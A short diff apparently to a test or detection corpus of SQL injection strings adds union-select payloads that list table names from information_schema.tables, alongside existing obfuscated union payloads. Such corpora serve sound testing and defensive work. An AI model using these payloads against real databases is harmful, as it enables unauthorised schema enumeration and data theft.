@@ -488,3 +488,9 @@ sin(1)-1 group by 1 union select 1--
 (select (select (1 - select 1))) union all select 2 --
 (select (select 1 - (select 1))) union all select 2 --
 (select 1 - (select 1 - (select 1))) union all select 2 --
+
+# moar unions
+-1 union distinct select table_name from information_schema.tables
+-1 union distinct all select table_name from information_schema.tables
+-1 union all distinct select table_name from information_schema.tables
+-1 union all select table_name from information_schema.tables
